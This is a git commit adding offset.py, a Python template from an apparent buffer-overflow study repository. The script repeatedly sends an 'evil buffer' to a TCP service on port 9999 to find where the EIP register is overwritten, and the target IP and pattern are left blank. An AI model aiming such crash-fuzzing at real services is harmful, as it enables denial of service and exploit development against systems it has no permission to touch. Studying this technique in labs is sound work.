d9b50395e0ddafbcb46c761208dfd39f66a9967c
Sivadath <52615657+sivadathdev@users.noreply.github.com>
2022-04-22 00:47:38 -0500

    Create offset.py
    Finding the exact positin where EIP register was overwritten

---
+++ stack-based-buffer-overflows/offset.py
@@ -0,0 +1,22 @@
+import socket, time, sys
+
+ip = ""
+port = 9999
+timeout = 5
+prefix = ""
+
+string = prefix + "" #offset here
+
+while True:
+  try:
+    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+      s.settimeout(timeout)
+      s.connect((ip, port))
+      s.recv(1024)
+      print("Sending evil buffer")
+      s.send(bytes(string, "latin-1"))
+      s.recv(1024)
+  except:
+    print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
+    sys.exit(0)
+  time.sleep(1)
